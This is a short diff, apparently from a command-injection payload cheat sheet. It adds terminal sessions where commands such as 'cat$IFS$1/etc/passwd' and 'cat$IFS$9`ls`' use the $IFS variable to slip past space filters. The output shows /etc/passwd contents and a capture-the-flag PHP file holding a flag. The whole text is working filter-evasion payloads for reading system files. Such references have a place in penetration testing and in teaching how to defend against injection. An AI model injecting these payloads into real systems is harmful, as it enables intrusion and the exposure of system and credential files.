@@ -79,6 +79,18 @@ swissky@crashlab▸ ~ ▸ $ cat$IFS/etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 
+swissky@crashlab▸ ~ ▸ $ cat$IFS$1/etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+
+swissky@crashlab▸ ~ ▸ $ cat$IFS$9`ls`
+<?php
+$flag = "flag{xxxxxxxxxxx}";
+?>
+/?ip=
+<?php
+if(isset($_GET['ac'])){
+
 swissky@crashlab▸ ~ ▸ $ cat$IFS$9/etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
